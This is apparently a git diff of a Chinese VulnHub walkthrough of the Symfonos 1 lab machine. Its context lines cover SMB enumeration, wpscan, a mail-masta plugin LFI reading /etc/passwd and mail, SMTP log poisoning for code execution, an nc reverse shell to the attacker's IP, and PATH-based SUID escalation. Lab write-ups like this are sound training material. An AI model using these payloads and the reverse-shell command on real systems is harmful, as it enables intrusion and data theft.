@@ -45,7 +45,7 @@ Note: You may need to update your host file for symfonos.local
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.148` 就是目标了
 
@@ -54,14 +54,14 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.148
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/2.png)
 
 开放的蛮多的,22、25、80、139、445,既然 445 开着,就跑一下 SMB 探测的工具
 ```
 enum4linux 192.168.141.148
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/3.png)
 
 有1个 /anonymous 可访问
 ```
@@ -71,14 +71,14 @@ smbclient //192.168.141.148/anonymous -U % -N
 
 参数 -N 用于空密码
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/4.png)
 
 有个文本文件,下下来看看
 ```
 get attention.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/5.png)
 
 按照文件所说,密码应该就是
 ```
@@ -96,7 +96,7 @@ helios
 smbclient //192.168.141.148/helios -U helios
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/8.png)
 
 把文件down下来看看
 ```
@@ -104,7 +104,7 @@ get research.txt
 get todo.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/9.png)
 
 research.txt 没什么帮助,todo 里提示了 `/h3l105` ,这个 `/` 就很灵性了,一般就可以猜想到和 web 有关
 
@@ -115,11 +115,11 @@ research.txt 没什么帮助,todo 里提示了 `/h3l105` ,这个 `/` 就很灵�
 echo "192.168.141.148 symfonos.local" >> /etc/hosts
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/6.png)
 
 啥都没有, /h3l105 试试
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/10.png)
 
 wordpress! 到了使用 wpscan 的时候了
 ```
@@ -131,7 +131,7 @@ wpscan --url http://symfonos.local/h3l105/ -e p --api-token xxxxxxx你的apitoke
 
 5.2.2 版本,只有 admin 一个用户,不过倒是有几个插件漏洞
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/11.png)
 
 SQL 注入里面有几个需要认证,这个没有,测一测 LFI
 
@@ -141,21 +141,21 @@ SQL 注入里面有几个需要认证,这个没有,测一测 LFI
 
 `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/12.png)
 
 可以,下面尝试从其他文件得到一些信息
 
 `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios`
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/13.png)
 
 既然可以读邮件,那么可以尝试一下密码找回
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/14.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/15.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/15.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/16.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/16.png)
 
 使用重置后的密码登录后台,尝试拿 shell 无果,google 后发现有人使用 SMTP 日志投毒配合 LFI 来进行 RCE https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/
 
@@ -170,11 +170,11 @@ data
 quit
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/17.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/17.png)
 
 访问 helios 邮件 `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&a=ip a` 测试
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/18.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/18.png)
 
 可以执行,测试回弹 shell,kali 监听
 ```
@@ -183,7 +183,7 @@ nc -lvp 4444
 
 访问 `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&a=nc -nv 192.168.141.134 4444 -e /bin/bash`
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/19.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/19.png)
 
 回弹成功,下面提权
 
@@ -197,11 +197,11 @@ sudo -l
 find / -perm -u=s 2>/dev/null
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/20.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/20.png)
 
 看上去啥也没有,尝试用下提权脚本
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/21.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/21.png)
 
 这里有个不常见的 suid 文件 statuscheck,看看是干嘛的
 ```
@@ -210,14 +210,14 @@ ls -l /opt
 /opt/statuscheck
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/22.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/22.png)
 
 内容看上去是个 web 的请求包,用 strings 在看看
 ```
 strings /opt/statuscheck
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/23.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/23.png)
 
 看上去是使用 curl 访问本地网页, `curl -I http://localhost`
 
@@ -234,6 +234,6 @@ ls
 cat proof.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/24.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos1/24.png)
 
 提权成功,感谢靶机作者 Zayotic
